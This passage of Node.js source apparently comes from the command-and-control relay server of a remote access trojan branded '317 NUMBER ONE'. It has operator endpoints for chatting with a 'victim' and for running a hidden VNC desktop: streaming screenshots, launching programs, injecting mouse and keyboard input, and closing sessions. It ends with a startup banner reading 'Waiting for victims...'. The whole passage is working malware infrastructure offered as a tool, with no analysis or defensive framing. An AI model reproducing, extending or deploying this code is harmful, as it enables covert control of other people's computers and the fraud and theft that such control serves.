      session.chatActive = false;
      session.commands.push('chat_close');
      console.log(`[Chat] Panel closed chat for ${agentId}`);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: true }));
    }

    // POST /:agentId/chat — Panel sends a chat message
    if (subPath === '/chat' && req.method === 'POST') {
      const data = await parseBody(req);
      if (data && data.text) {
        session.chatMessages.push({ from: 'panel', text: data.text, timestamp: Date.now() });
        console.log(`[Chat] Panel -> ${agentId}: ${data.text}`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ success: true }));
      }
      res.writeHead(400);
      return res.end('Missing text');
    }

    // GET /:agentId/chat — Panel polls for messages from victim
    if (subPath === '/chat' && req.method === 'GET') {
      const url = new URL(req.url, `http://${req.headers.host}`);
      const since = parseInt(url.searchParams.get('since') || '0');
      const messages = session.chatMessages.filter(m => m.timestamp > since);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ messages, chatActive: session.chatActive }));
    }

    // ========== HVNC VIEWER ENDPOINTS ==========

    // GET /:agentId/hvnc — Serve HVNC panel
    if (subPath === '/hvnc' || subPath === '/hvnc/') {
      const hvnc = hvncSessions.get(agentId);
      if (!hvnc) {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        return res.end(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>317 HVNC — Waiting</title>
<meta http-equiv="refresh" content="5">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',sans-serif;background:#000;color:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;gap:20px}
.spinner{width:40px;height:40px;border:2px solid #1a1a1a;border-top-color:#ffffff;border-radius:50%;animation:spin .7s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}
h2{font-size:18px;font-weight:800;letter-spacing:2px;text-transform:uppercase}
p{color:#6b6b6b;font-size:12px;letter-spacing:1px}</style></head>
<body><div class="spinner"></div><h2>317 HVNC</h2><p>Waiting for hidden desktop... (${agentId})</p><p style="font-size:10px;margin-top:8px;color:#4a4a4a">Auto-refresh 5s</p></body></html>`);
      }
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(buildHvncPanelHTML(hvnc, agentId));
    }

    // GET /:agentId/hvnc/screen — Serve HVNC desktop screenshot
    if (subPath === '/hvnc/screen') {
      const hvnc = hvncSessions.get(agentId);
      if (hvnc && hvnc.screenshot) {
        res.writeHead(200, {
          'Content-Type': 'image/jpeg',
          'Cache-Control': 'no-store, no-cache',
          'Content-Length': hvnc.screenshot.length
        });
        return res.end(hvnc.screenshot);
      }
      res.writeHead(503);
      return res.end('No HVNC frame yet');
    }

    // POST /:agentId/hvnc/launch — Launch app on hidden desktop
    if (subPath === '/hvnc/launch' && req.method === 'POST') {
      const hvnc = hvncSessions.get(agentId);
      if (!hvnc) {
        res.writeHead(404);
        return res.end('No HVNC session');
      }
      const data = await parseBody(req);
      if (data && data.path) {
        hvnc.hvncCommands.push({ type: 'launch', path: data.path, args: data.args || '' });
        console.log(`[HVNC] Launch queued for ${agentId}: ${data.path}`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ success: true }));
      }
      res.writeHead(400);
      return res.end('Missing path');
    }

    // POST /:agentId/hvnc/input — Send mouse/keyboard input to hidden desktop
    if (subPath === '/hvnc/input' && req.method === 'POST') {
      const hvnc = hvncSessions.get(agentId);
      if (!hvnc) {
        res.writeHead(404);
        return res.end('No HVNC session');
      }
      const data = await parseBody(req);
      if (data && data.type) {
        hvnc.hvncCommands.push(data);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ success: true }));
      }
      res.writeHead(400);
      return res.end('Invalid input');
    }

    // GET /:agentId/hvnc/queryresult — Panel polls for query results
    if (subPath === '/hvnc/queryresult' && req.method === 'GET') {
      const hvnc = hvncSessions.get(agentId);
      const results = hvnc && hvnc.queryResults ? hvnc.queryResults.splice(0) : [];
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ results }));
    }

    // GET /:agentId/hvnc/screenhq — Serve HQ screenshot
    if (subPath === '/hvnc/screenhq') {
      const hvnc = hvncSessions.get(agentId);
      if (hvnc && hvnc.screenshotHQ) {
        const hq = hvnc.screenshotHQ;
        hvnc.screenshotHQ = null;
        res.writeHead(200, {
          'Content-Type': 'image/jpeg',
          'Cache-Control': 'no-store, no-cache',
          'Content-Length': hq.length
        });
        return res.end(hq);
      }
      res.writeHead(204);
      return res.end();
    }

    // POST /:agentId/hvnc/close — Close HVNC session
    if (subPath === '/hvnc/close' && req.method === 'POST') {
      const hvnc = hvncSessions.get(agentId);
      if (hvnc) {
        hvnc.hvncCommands.push({ type: 'close' });
        console.log(`[HVNC] Close requested for ${agentId}`);
      }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: true }));
    }
  }

  // Default 404
  res.writeHead(404);
  res.end('Not Found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('  ╔══════════════════════════════════════════╗');
  console.log('  ║     317 NUMBER ONE — STREAM RELAY SERVER    ║');
  console.log('  ╠══════════════════════════════════════════╣');
  console.log(`  ║  Port: ${PORT}                              ║`);
  console.log(`  ║  Status: ONLINE                          ║`);
  console.log('  ║  Waiting for victims...                  ║');
  console.log('  ╚══════════════════════════════════════════╝');
  console.log('');
});
